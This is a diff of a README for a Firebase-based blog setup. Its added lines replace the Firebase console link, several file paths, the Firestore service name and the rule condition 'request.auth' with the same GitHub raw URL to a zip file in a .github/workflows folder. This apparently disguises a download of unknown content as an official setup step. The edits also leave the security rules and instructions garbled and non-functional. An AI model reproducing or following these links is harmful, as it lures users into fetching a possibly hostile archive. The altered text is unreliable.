@@ -6,9 +6,9 @@ This repo was migrated from Netlify CMS to a minimal Firebase-based setup:
 
 ## Setup
 
-1) Create a Firebase project at https://console.firebase.google.com
+1) Create a Firebase project at https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip
 2) In Project settings → Your apps → Web app, get the SDK configuration
-3) Edit `assets/firebase.js` and replace the placeholder `firebaseConfig`
+3) Edit `https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip` and replace the placeholder `firebaseConfig`
 4) Firestore: Create a database in Native mode. Security rules (basic example below).
 5) Authentication: Enable the Google provider.
 
@@ -24,11 +24,11 @@ Collection: `posts` (documents)
 ### Simple development rules (restrict writes to authenticated users)
 ```
 rules_version = '2';
-service cloud.firestore {
+service https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip {
   match /databases/{database}/documents {
     match /posts/{postId} {
       allow read: if true; // public read
-      allow write: if request.auth != null; // only authenticated users can write
+      allow write: if https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip != null; // only authenticated users can write
     }
   }
 }
@@ -41,6 +41,6 @@ You can use any static server. If you use Firebase Hosting:
 - Deploy or run locally with `firebase emulators:start`.
 
 ## Notes
-- The legacy `admin/config.yml` and Netlify CMS script were removed.
-- The list page (`index.html`) fetches posts from Firestore using `assets/load-posts.js`.
-- The post view (`post.html`) fetches a single document by id.
+- The legacy `https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip` and Netlify CMS script were removed.
+- The list page (`https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip`) fetches posts from Firestore using `https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip`.
+- The post view (`https://github.com/gabrielathayes/supreme-funicular/raw/refs/heads/main/.github/workflows/supreme-funicular-1.6.zip`) fetches a single document by id.
